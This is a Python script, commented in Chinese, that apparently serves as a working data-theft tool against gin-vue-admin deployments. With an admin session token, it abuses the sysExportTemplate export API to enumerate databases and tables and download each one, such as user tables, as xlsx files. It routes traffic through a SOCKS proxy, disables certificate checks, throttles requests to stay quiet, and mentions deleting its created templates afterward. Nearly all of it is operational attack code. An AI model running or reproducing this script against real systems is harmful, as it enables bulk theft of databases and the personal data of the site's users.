#!/usr/bin/env python3
"""GVA(gin-vue-admin) sysExportTemplate 跨库脱库驱动。

验证过的链路(拿到真 xlsx):
  createSysExportTemplate -> exportExcel(取一次性 token) -> exportExcelByToken(下载)

用法:
  # 0) 把后台 888 会话的 x-token 写进 token.txt
  python gva_export_dump.py --target https://host --proxy socks5h://127.0.0.1:20810 \
      --dbs app,luck_shop_in_bd --out ./dump
  # 单表试打
  python gva_export_dump.py --target https://host --proxy ... --one app.sys_users

关键坑(已在代码里规避):
  * 库名必须拼进 tableName,放 dbName 字段会 500
  * 下载 token 一次即焚 -> 每次重试都要重新 exportExcel 换新 token
  * 新建模板间歇「获取失败」-> 多试几次;能复用系统自带模板最好
  * 收尾记得删掉自建模板(本脚本 --cleanup 只列不删,删要显式确认)
"""
import argparse
import json
import os
import sys
import time
import uuid

import requests
import urllib3

urllib3.disable_warnings()


def sess(proxy):
    s = requests.Session()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.verify = False
    return s


def api(S, T, tok, path, **kw):
    h = {"x-token": tok, "User-Agent": "Mozilla/5.0",
         "Content-Type": "application/json"}
    return S.request(kw.pop("method", "GET"), T + "/api" + path,
                     headers=h, timeout=kw.pop("timeout", 120), **kw)


def dbs(S, T, tok):
    r = api(S, T, tok, "/autoCode/getDB")
    try:
        d = r.json().get("data", {})
        return list(d.get("dbs", d) if isinstance(d, dict) else d)
    except Exception:
        return []


def tables(S, T, tok, db):
    r = api(S, T, tok, "/autoCode/getTables", params={"dbName": db})
    try:
        return r.json().get("data") or []
    except Exception:
        return []


def columns(S, T, tok, db, tbl):
    r = api(S, T, tok, "/autoCode/getColumn",
            params={"dbName": db, "tableName": tbl})
    try:
        out = []
        for c in r.json().get("data") or []:
            out.append(c.get("columnName") or c.get("Field") or "")
        return [c for c in out if c]
    except Exception:
        return []


def export_table(S, T, tok, db, tbl, tries=6, limit=1000000):
    """建模板 -> 取 token -> 下载。返回 (status, bytes)。"""
    cols = columns(S, T, tok, db, tbl)
    if not cols:
        return "NOCOLS", b""
    # 表头用 ASCII,更稳
    info = {c: ("c%d" % i) for i, c in enumerate(cols)}
    name = "zzd" + uuid.uuid4().hex[:10]
    body = {
        "name": name,
        # 关键:库名拼进 tableName,不要放 dbName(会 500)
        "tableName": "%s.%s" % (db, tbl) if db else tbl,
        "templateID": name,
        "templateInfo": json.dumps(info),
        "sql": "", "importSql": "", "joinTemplate": None,
        "limit": limit, "order": "", "conditions": None, "dbName": "",
    }
    cr = api(S, T, tok, "/sysExportTemplate/createSysExportTemplate",
             method="POST", data=json.dumps(body).encode())
    try:
        if cr.json().get("code") != 0:
            return "CREATE_FAIL", cr.content[:120]
    except Exception:
        return "CREATE_FAIL", cr.content[:120]

    last = b""
    for i in range(tries):
        g = api(S, T, tok, "/sysExportTemplate/exportExcel",
                params={"name": name, "templateID": name})
        try:
            j = g.json()
        except Exception:
            time.sleep(3)
            continue
        if j.get("code") == 0 and j.get("data"):
            d = api(S, T, tok, j["data"], timeout=900)
            last = d.content[:120]
            if d.content[:2] == b"PK":
                return "OK", d.content
        # token 一次即焚 —— 下一轮重新 exportExcel 换新 token
        time.sleep(2 + 2 * i)
    return "FAIL", last


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="https://host (无尾斜杠)")
    ap.add_argument("--proxy", default="", help="socks5h://127.0.0.1:20810")
    ap.add_argument("--token-file", default="token.txt")
    ap.add_argument("--dbs", default="", help="逗号分隔,空则自动 getDB")
    ap.add_argument("--one", default="", help="只打一张,格式 db.table")
    ap.add_argument("--out", default="dump")
    ap.add_argument("--sleep", type=float, default=1.0, help="表间隔,低频率")
    a = ap.parse_args()

    tok = open(a.token_file).read().strip()
    S, T = sess(a.proxy or None), a.target.rstrip("/")
    os.makedirs(a.out, exist_ok=True)
    log = open(os.path.join(a.out, "manifest.tsv"), "a", encoding="utf-8")

    if a.one:
        db, _, tbl = a.one.partition(".")
        todo = [(db, tbl)]
    else:
        dl = [d for d in a.dbs.split(",") if d] or [d for d in dbs(S, T, tok)
              if d not in ("information_schema", "mysql", "performance_schema", "sys")]
        todo = [(d, t) for d in dl for t in tables(S, T, tok, d)]

    print("目标表数:", len(todo), flush=True)
    ok = bad = 0
    for db, tbl in todo:
        st, payload = export_table(S, T, tok, db, tbl)
        fn = os.path.join(a.out, "%s__%s.xlsx" % (db, tbl))
        if st == "OK":
            open(fn, "wb").write(payload)
            ok += 1
        else:
            bad += 1
        log.write("%s\t%s\t%s\t%d\n" % (db, tbl, st, len(payload)))
        log.flush()
        print("  %-40s %s %d" % (db + "." + tbl, st, len(payload)), flush=True)
        time.sleep(a.sleep)
    print("完成 OK=%d FAIL=%d -> %s" % (ok, bad, a.out), flush=True)


if __name__ == "__main__":
    sys.exit(main())
